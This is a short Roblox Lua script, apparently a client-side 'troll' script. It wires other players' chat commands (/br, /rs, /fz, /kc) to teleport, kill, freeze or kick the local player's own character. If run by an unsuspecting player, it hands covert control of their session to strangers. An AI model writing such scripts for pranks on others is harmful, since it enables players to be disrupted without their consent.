local plrs = game:GetService("Players")
local plr = plrs.LocalPlayer

function xc_cmds(t, name)
  local hrp = plr and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
  local hmoid = plr and plr.Character and plr.Character:FindFirstChildOfClass("Humanoid")
  if hrp and name == "/br" then
    local enm = t and t.Character and t.Character:FindFirstChild("HumanoidRootPart")
    if enm then
      hrp.CFrame = CFrame.new(enm.Position)
      task.wait(0.1)
      hrp.Anchored = not hrp.Anchored
    end
  elseif hmoid and name == "/rs" then
    hmoid.Health = 0
  elseif name == "/fz" then
    hrp.Anchored = not hrp.Anchored
  elseif name == "/kc" then
    plr:Kick("LOL 😂")
  end
end

for _, usr in next, plrs:GetPlayers() do
  if usr and usr ~= plr then
    usr.Chatted:Connect(function(str)
      xc_cmds(usr, str:lower())
    end)
  end
end

plrs.PlayerAdded:Connect(function(t)
  if t and t ~= plr then
    t.Chatted:Connect(function(str)
      xc_cmds(t, str:lower())
    end)
  end
end)

print("[Troll CMDS: Loaded]\n[/br, /rs, /fz, /kc]")
